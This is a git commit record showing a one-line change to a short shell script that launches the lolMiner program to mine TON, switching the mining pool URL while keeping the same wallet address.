270ebb7a4006df708732e6b7a09723a406466482
jsiqiisn <100444720+jsiqiisn@users.noreply.github.com>
2022-06-09 22:42:51 +0700

    Update a.sh

--- a.sh
+++ a.sh
@@ -1,2 +1,2 @@
 chmod 777 lolMiner
-./lolMiner --algo TON --pool wss://eu1.stratum.ton-pool.com/stratum --user EQAhYfA5-ENSYrig434CEOSFH47z5I6hft6X6magteGGEwlT
+./lolMiner --algo TON --pool wss://stratum.whalestonpool.com/stratum --user EQAhYfA5-ENSYrig434CEOSFH47z5I6hft6X6magteGGEwlT
